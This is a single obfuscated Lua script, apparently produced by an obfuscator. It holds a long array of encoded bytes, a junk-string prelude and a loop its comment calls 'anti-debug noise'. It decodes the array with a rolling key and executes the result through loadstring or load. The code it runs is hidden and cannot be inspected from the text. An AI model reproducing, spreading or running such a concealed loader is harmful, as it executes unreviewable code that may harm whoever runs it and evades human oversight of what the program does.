([[fdasguplsbkjkgyuresgdfdasguplsbkjkgyuresgdjdvs_dvcddvfdasguplsbkjkgyuresgdjdvs_dvcddvjdvs_dvcddvfdasguplsbkjkgyuresgdjdvs_dvcddvfdasguplsbkjkgyuresgdjdvs_dvcddvjdvs_dvcddvfdasguplsbkjkgyuresgdjdvs_dvcddvfdasguplsbkjkgyuresgdfdasguplsbkjkgyuresgdfdasguplsbkjkgyuresgd]]):gsub('.+',function(a) MmPsicDZschO=a end); return (function(...)
  local sfdvOEMdug=82; local voDydsqxziw=8; local uLEUrwzCl=12;
  local rTImzbdm={
    194,216,227,252,22,222,236,53,58,71,110,118,131,166,186,195,224,235,254,18,39,57,89,98,119,146,175,175,193,213,233,224,251,240,26,46,66,86,84,126,146,166,186,206,226,246,10,30,50,70,90,186,209,217,235,10,210,22,70,79,123,123,156,177,
    114,163,154,245,3,35,47,24,57,107,142,129,167,200,224,231,245,11,226,240,50,98,107,151,151,184,205,144,171,160,22,45,53,71,102,46,110,165,173,191,222,214,6,15,59,59,92,30,79,70,138,186,195,239,239,16,37,244,38,93,101,119,150,142,
    190,199,243,243,20,192,212,74,97,105,123,154,98,188,223,236,245,26,35,61,80,22,109,148,133,137,176,212,248,190,211,200,242,6,26,46,150,151,189,201,160,253,251,23,54,254,28,44,71,79,68,110,130,150,170,10,33,41,59,90,34,120,139,161,
    189,214,219,241,13,214,7,254,62,117,125,143,174,166,214,223,11,11,44,8,57,87,115,146,120,181,204,177,234,255,22,34,250,8,60,111,133,161,186,191,213,241,188,218,226,14,19,8,50,70,90,110,203,220,170,12,33,58,250,80,99,121,149,174,
    179,201,229,174,22,30,47,76,18,120,127,162,183,200,216,158,247,20,30,216,236,22,42,62,82,178,201,209,227,2,202,43,242,35,26,112,131,153,181,206,211,233,5,232,8,63,88,98,88,143,172,193,214,185,242,7,30,42,2,16,86,133,153,170,
    159,199,232,239,9,35,47,76,102,40,67,56,98,118,138,158,251,12,218,60,81,106,42,139,82,186,194,211,240,182,28,35,70,91,108,124,66,155,184,194,124,144,186,206,226,246,86,109,117,135,166,110,207,229,238,190,239,230,71,40,72,127,152,162,
    152,207,236,1,22,249,50,71,94,106,66,80,138,191,222,224,1,30,2,47,80,90,118,131,164,104,131,120,162,182,202,222,59,76,26,123,145,154,106,191,224,234,186,27,49,58,36,71,133,103,98,112,175,229,238,19,30,43,45,81,116,127,154,178,
    116,143,154,2,10,27,56,232,18,38,58,78,98,118,138,158,254,21,29,47,78,22,112,131,160,188,122,171,162,253,15,50,69,75,104,132,74,163,185,194,155,144,186,206,226,246,10,30,50,70,160,189,212,150,233,202,210,44,79,92,101,54,147,172,
    114,214,219,247,20,41,242,69,87,122,129,145,106,202,220,243,247,207,227,238,70,101,20,62,82,102,122,142,162,182,202,222,242,6,26,119,136,86,190,215,226,235,9,20,234,60,95,108,117,79,90,139,159,150,172,4,39,52,61,98,107,133,152,96,
    114,199,232,242,194,36,57,82,18,109,127,162,171,196,208,237,186,12,47,60,69,31,56,140,147,179,191,142,246,254,15,44,220,6,26,46,66,86,106,126,146,166,186,206,226,246,10,30,50,143,160,110,201,219,254,4,23,52,80,22,104,139,152,161,
    123,134,183,203,194,28,47,76,104,38,142,150,167,196,116,158,178,198,218,238,2,22,42,62,82,102,122,142,162,182,202,222,242,6,26,122,145,153,171,202,146,245,5,218,226,57,89,108,133,154,173,110,159,150,250,1,19,50,70,22,105,123,158,161,
    193,212,237,2,3,36,62,81,30,38,128,163,176,185,147,136,178,198,218,238,2,22,42,62,82,102,122,142,162,182,202,222,242,6,26,46,139,156,106,205,221,166,14,22,39,68,244,30,50,70,90,110,130,150,170,190,210,230,250,14,34,54,74,94,
    114,134,154,174,194,214,234,68,97,120,58,151,110,118,224,158,251,20,218,62,67,95,124,145,90,169,201,220,245,10,29,231,242,74,105,24,66,86,106,126,146,166,186,206,226,246,10,30,50,70,90,110,130,150,170,190,210,230,250,14,34,54,74,94,
    187,204,154,4,194,243,7,254,35,52,79,78,182,190,207,236,156,198,218,238,2,22,42,62,82,102,122,142,162,182,202,222,242,6,26,46,66,86,106,126,146,166,186,206,226,246,10,30,50,150,157,175,206,226,178,4,39,52,61,98,107,133,152,102,
    123,112,154,174,194,214,234,254,18,38,58,78,98,118,138,158,178,198,218,238,2,22,42,62,82,102,122,142,162,182,202,222,242,6,26,46,66,86,174,195,212,251,1,220,53,59,94,97,129,148,173,194,195,228,254,198,24,59,72,81,46,54,147,106,
    114,158,170,190,203,192,234,254,18,38,58,78,98,118,138,158,178,198,218,238,2,22,42,62,82,102,122,142,162,182,202,222,242,6,26,46,66,86,175,204,214,175,164,206,226,246,10,30,50,70,90,110,130,150,170,190,210,230,250,14,34,54,74,94,
    114,134,154,174,194,214,234,67,96,106,36,78,98,118,138,158,178,198,218,238,2,22,42,62,82,102,122,142,162,182,202,222,242,6,26,115,144,154,84,126,146,166,186,206,226,246,10,30,50,70,90,110,130,150,170,190,210,230,250,83,112,122,52,94,
    114,134,154,174,194,214,234,254,18,38,58,78,98,118,138,227,0,10,196,238,2,22,42,62,82,102,122,142,162,182,202,35,64,74,4,46,66,86,106,126,146,166,186,19,48,58,244,30,50,70,90,179,208,218,148,3,32,42,228,248,101,140,125,129,
    168,204,240,182,203,192,212,42,97,105,123,154,146,194,203,247,247,24,232,17,74,87,124,127,149,186,191,224,195,250,14,35,54,32,61,125,144,164,175,193,230,174,0,35,48,57,94,103,129,148,98,119,108,237,235,7,38,238,12,23,12,54,74,94,
    114,201,240,225,229,12,48,84,26,47,36,147,176,186,147,136,156,15,32,238,80,101,126,62,155,185,185,225,251,4,11,46,69,75,89,116,151,164,173,210,219,245,8,206,54,62,79,108,28,70,90,110,130,220,255,12,21,58,67,93,112,54,147,177,
    177,217,243,252,3,38,61,67,81,108,143,156,165,202,211,237,0,206,25,247,2,104,111,146,167,184,200,142,232,247,22,49,55,6,95,124,134,64,175,204,214,144,164,26,49,57,75,106,50,154,155,192,201,219,254,17,210,3,250,105,12,54,74,94,
    114,193,156,241,24,9,13,52,88,124,60,139,98,147,138,242,4,27,31,250,236,22,42,62,82,161,124,216,230,12,29,29,54,92,93,114,134,172,108,187,146,195,186,34,52,75,79,8,143,48,68,180,209,232,170,253,222,230,64,99,112,121,74,167,
    192,134,232,243,26,42,246,254,89,107,142,149,165,126,222,240,7,11,227,238,70,101,20,62,82,102,122,215,232,182,30,55,66,75,105,116,74,156,191,204,213,175,186,235,255,246,12,100,135,148,157,194,203,229,248,192,210,39,72,82,34,132,153,178,
    114,207,237,237,21,47,56,63,98,121,127,141,168,203,216,225,6,15,41,60,10,92,127,140,149,111,122,226,234,251,24,200,242,6,26,46,66,86,106,126,222,245,253,15,46,246,83,108,120,149,90,139,130,218,239,0,39,45,8,85,103,138,147,172,
    184,213,162,244,23,36,45,7,252,38,58,78,98,118,138,158,178,15,32,238,75,100,112,141,82,167,200,210,162,10,11,48,57,75,110,129,125,159,184,196,225,180,8,15,47,59,71,30,134,142,159,188,108,150,170,190,210,230,250,14,34,54,74,94,
    114,206,233,253,13,28,63,76,85,122,131,157,176,126,208,243,0,9,230,238,72,107,120,129,166,175,201,220,170,196,216,236,251,6,108,115,150,171,188,204,146,244,3,26,226,59,88,98,59,48,90,110,130,150,170,190,210,230,63,92,102,32,74,94,
    114,134,223,252,6,192,47,76,86,16,36,154,177,185,203,234,178,25,31,64,88,95,109,131,165,102,151,142,253,160,202,222,242,6,97,111,143,155,132,165,215,250,237,19,52,76,83,97,119,78,92,164,209,223,237,3,245,46,59,98,85,123,156,180,
    187,201,223,176,203,226,212,254,18,38,58,149,163,195,207,184,217,11,46,33,71,104,128,135,149,171,130,144,196,8,25,53,69,75,108,97,135,168,192,199,213,235,188,215,238,224,10,30,50,70,161,175,207,219,196,229,23,58,45,83,116,140,147,161,
    183,142,156,207,21,41,47,82,69,107,140,164,171,185,207,160,187,176,55,216,236,92,121,144,82,165,134,142,245,251,28,52,59,73,95,46,139,164,106,199,226,231,3,32,53,254,93,99,132,156,163,177,199,233,179,190,22,53,228,14,34,54,74,164,
    193,216,154,237,206,214,57,64,92,38,131,156,98,191,218,223,251,24,45,246,85,91,124,148,155,169,191,168,201,251,30,2,55,89,93,115,144,154,171,204,230,249,194,215,235,246,78,109,28,70,90,110,130,150,170,190,210,47,64,14,113,120,148,120,
    155,217,187,182,196,9,45,80,91,118,142,80,107,118,203,236,246,198,41,48,76,36,88,127,159,171,148,219,227,10,13,38,250,8,85,108,71,173,169,187,148,175,186,15,48,58,10,109,116,144,116,151,213,186,239,17,21,43,72,82,99,132,158,141,
    184,142,225,239,15,27,243,254,102,110,127,156,76,118,138,158,178,198,218,238,2,22,42,62,82,182,189,207,238,2,210,36,71,84,93,130,139,165,184,134,155,144,186,206,226,246,10,30,50,70,90,110,130,150,170,190,210,230,73,80,108,80,110,163,
    197,218,236,253,27,222,243,232,18,38,58,78,98,118,138,158,178,198,218,238,71,100,110,71,60,102,122,142,162,182,202,222,242,75,104,114,44,86,106,126,146,235,8,18,204,59,88,98,28,48,166,189,197,215,246,190,24,59,72,81,118,127,153,172,
    114,217,223,0,24,31,45,67,58,103,141,123,177,186,223,234,247,249,29,64,75,102,126,70,165,171,204,228,235,249,15,231,220,6,26,46,66,156,185,208,146,229,198,206,37,62,83,106,118,70,163,188,130,223,250,255,27,56,77,22,117,123,156,180,
    187,201,223,200,233,27,62,33,90,111,134,146,180,187,216,166,187,207,218,50,81,0,42,62,82,102,122,142,162,182,19,36,242,73,98,119,142,154,132,167,229,199,194,208,15,69,78,115,126,139,141,177,212,223,250,18,212,239,250,98,106,123,152,72,
    114,134,154,174,194,214,234,254,18,38,58,78,180,187,222,243,4,20,218,66,84,107,111,40,82,102,122,142,162,182,202,222,55,84,94,24,66,86,106,126,215,244,254,184,226,246,10,30,132,139,174,195,212,228,170,4,19,50,77,83,12,123,152,162,
    92,112,230,253,5,23,54,254,102,103,140,149,167,202,189,227,4,28,35,49,71,22,71,62,160,175,198,120,140,252,25,48,242,69,38,46,149,155,188,212,219,233,255,206,43,68,10,103,130,135,163,192,213,158,253,3,36,60,67,81,103,137,83,94,
    182,213,132,174,194,214,234,71,88,38,136,157,182,118,221,227,4,28,35,49,71,62,107,145,127,181,190,227,238,251,253,33,68,79,106,130,74,169,175,208,232,239,253,19,235,246,94,102,119,148,68,110,130,150,170,190,210,230,250,98,99,136,145,163,
    198,185,223,0,24,31,45,67,18,67,58,161,167,200,224,231,245,11,196,238,2,22,42,62,82,102,122,208,244,251,11,41,220,6,26,46,66,155,184,194,124,235,8,18,204,224,83,100,50,154,155,192,201,219,254,241,23,56,80,87,101,123,74,178,
    186,203,232,152,194,214,234,254,88,117,140,78,161,130,138,237,244,16,218,55,80,22,122,127,155,184,205,150,233,251,30,44,59,82,99,124,149,170,171,204,213,235,13,214,235,255,10,98,129,48,90,110,130,150,170,190,210,230,67,84,34,138,163,174,
    183,213,224,182,17,24,52,7,18,67,87,78,100,159,216,241,6,7,40,49,71,24,42,127,160,170,122,221,228,0,216,1,62,71,109,129,112,151,183,195,146,195,215,206,228,35,89,98,135,146,159,161,197,232,243,14,38,232,250,98,106,123,152,72,
    114,134,154,174,194,214,234,254,18,38,58,78,178,185,203,234,254,206,32,67,80,89,126,135,161,180,130,151,140,182,202,222,242,6,26,46,66,86,106,126,146,166,186,206,226,69,76,104,64,118,155,192,199,228,254,190,239,230,78,79,116,125,143,178,
    165,203,236,4,11,25,47,232,18,38,58,78,98,118,138,158,178,198,218,238,71,100,110,71,60,102,122,142,162,182,202,222,242,75,104,114,44,86,106,126,146,235,8,18,204,59,88,98,28,48,166,189,197,215,246,190,23,60,63,92,118,137,112,173,
    190,202,223,0,194,243,234,69,83,115,127,104,137,187,222,209,247,24,48,55,69,91,50,64,132,171,202,218,235,249,11,50,55,74,77,130,145,168,171,197,215,168,195,232,25,55,83,114,88,149,172,145,202,223,246,2,218,232,31,100,103,132,158,177,
    116,143,132,250,17,25,43,74,18,122,123,160,169,187,222,208,247,19,41,66,71,0,20,132,161,184,122,205,174,182,25,32,60,6,99,124,66,159,186,191,219,248,13,214,39,76,79,108,134,153,128,189,206,218,239,16,236,13,63,98,69,126,147,170,
    182,216,223,252,202,223,243,254,86,117,36,78,98,118,138,231,248,198,41,48,76,48,83,145,115,110,124,192,231,3,25,50,55,43,112,115,144,170,108,135,146,231,8,18,226,69,76,104,64,116,155,187,199,176,247,255,38,41,66,22,36,113,136,99,
    201,197,215,176,203,214,62,70,87,116,36,78,98,118,138,158,178,198,218,66,67,104,113,131,166,152,191,219,241,10,15,222,15,6,105,112,140,64,106,126,146,166,186,206,226,246,76,112,119,135,165,88,130,150,170,190,23,52,62,248,103,132,142,72,
    92,210,233,241,3,34,234,67,96,105,137,146,167,163,217,226,7,18,31,216,72,101,124,62,145,114,122,225,231,8,32,39,53,75,26,119,144,86,179,206,211,239,12,33,234,73,79,112,136,143,157,179,213,159,170,2,33,208,250,14,34,54,144,173,
    196,134,217,186,194,37,44,72,18,111,136,78,171,198,203,231,4,25,226,65,71,104,128,135,149,171,148,181,231,10,238,35,69,73,95,124,134,151,184,210,229,174,195,215,226,58,89,8,50,70,90,110,130,150,170,190,27,44,250,93,100,128,100,135,
    197,167,162,176,239,37,46,83,94,107,109,145,180,191,218,242,180,207,218,47,80,90,42,141,148,176,136,188,227,3,15,248,63,71,110,113,138,94,108,185,208,171,17,13,31,248,19,30,134,142,159,188,108,150,170,190,210,230,250,14,34,54,74,94,
    114,213,220,248,208,4,43,75,87,38,87,78,100,155,216,225,1,10,31,27,81,90,127,138,151,104,100,142,162,182,202,222,242,6,26,46,66,86,106,195,224,233,9,18,39,35,89,98,135,146,159,110,159,150,249,0,28,208,250,14,34,54,74,94,
    114,134,154,174,194,214,44,80,87,103,133,56,98,118,138,158,178,198,218,238,71,100,110,40,82,102,122,142,231,4,14,200,242,6,26,46,139,156,106,195,224,233,9,18,39,35,89,98,135,146,159,110,214,222,239,12,210,40,76,83,99,129,74,163,
    192,202,132,243,16,26,212,232,94,117,125,143,174,118,188,243,0,249,31,64,88,95,109,131,82,131,122,213,227,3,15,248,25,75,110,97,135,168,192,199,213,235,194,208,20,75,88,81,119,152,176,183,197,219,172,199,188,208,67,84,34,123,152,161,
    193,202,223,219,17,26,63,74,87,38,123,156,166,118,222,223,4,13,31,66,52,91,119,141,166,171,122,226,234,251,24,200,242,6,26,46,142,165,173,191,222,166,223,28,37,69,78,99,50,99,90,192,199,231,255,7,36,43,2,83,112,121,153,162,
    183,179,233,242,23,34,47,7,252,16,58,78,98,118,214,237,245,7,38,238,72,107,120,129,166,175,201,220,162,251,23,51,62,71,110,115,106,151,184,194,229,238,251,25,39,254,19,8,50,70,90,110,130,150,170,190,30,53,61,79,110,54,157,163,
    196,220,223,0,246,31,55,67,18,67,58,165,177,200,213,241,2,7,29,51,28,61,111,146,133,171,204,228,231,8,254,39,63,75,72,125,153,94,115,104,146,166,186,206,226,246,10,30,126,149,157,175,206,150,250,255,36,58,11,14,63,54,111,172,
    181,213,222,243,208,27,56,65,97,106,127,86,100,193,221,241,5,25,45,251,4,22,56,76,82,186,201,225,246,8,19,44,57,14,103,111,150,158,120,209,219,244,194,33,39,72,96,99,132,122,163,187,199,159,170,200,210,252,19,14,49,54,92,108,
    138,152,173,192,203,223,212,254,18,38,58,78,98,118,138,234,1,9,27,58,2,102,107,144,166,120,122,171,162,219,24,33,65,74,95,60,135,164,173,205,214,235,194,34,49,73,94,112,123,148,161,118,207,215,254,6,224,57,67,92,42,137,143,176,
    200,203,236,226,11,35,47,7,18,53,58,98,117,140,161,177,194,216,237,247,11,0,42,62,82,102,122,142,162,182,30,31,68,77,95,130,116,155,183,205,230,235,212,244,43,72,79,81,119,152,176,179,212,158,250,255,36,58,11,26,34,134,139,176,
    198,152,163,152,194,214,234,254,87,116,126,56,76,118,138,158,178,18,41,49,67,98,42,131,158,167,202,225,231,250,202,251,242,22,4,46,66,86,106,176,231,244,237,19,52,76,83,97,119,84,130,179,195,232,254,0,23,39,78,40,69,133,152,172,
    183,201,238,182,8,43,56,65,102,111,137,156,106,186,222,167,156,198,218,238,2,22,42,62,82,171,198,207,242,9,15,34,242,17,55,46,134,170,84,126,146,166,186,206,226,246,10,103,120,70,159,186,195,230,253,3,22,230,24,43,34,71,90,94,
    198,206,223,252,172,214,234,254,18,38,58,78,98,118,138,158,178,11,38,47,82,105,111,130,82,131,122,158,140,182,202,222,242,6,26,46,66,86,106,126,146,235,7,35,46,55,94,99,90,135,168,178,213,222,235,9,23,238,3,248,34,54,74,94,
    114,134,154,174,7,36,46,232,18,38,58,78,167,196,206,167,156,11,38,65,71,0,111,140,150,80,209,207,244,4,210,224,38,78,99,129,99,164,190,199,181,238,255,15,54,24,99,110,115,153,173,179,198,184,3,241,31,59,76,84,123,69,112,170,
    183,222,219,176,203,192,47,80,100,117,140,86,100,206,203,246,243,30,27,70,67,110,107,114,154,171,169,220,238,15,254,16,69,57,93,128,139,166,190,126,172,248,9,20,46,16,12,39,28
  };
  local _t={}; local _s={};
  -- lightweight anti-debug noise
  for _i=1,3 do _t[_i]=(_i*sfdvOEMdug)%(sfdvOEMdug+voDydsqxziw+uLEUrwzCl) end
  for i=1,#rTImzbdm do
    local n=(rTImzbdm[i] - (sfdvOEMdug + (i-1)*voDydsqxziw)) % 256
    _s[i]=string.char(n)
    sfdvOEMdug = (sfdvOEMdug + uLEUrwzCl) % 256
  end
  local EHCelFxjDJ=table.concat(_s)
  local CYewWTcCqkkS=(loadstring or load)
  local _f=CYewWTcCqkkS(EHCelFxjDJ)
  if _f then return _f(...) end
end)(...)
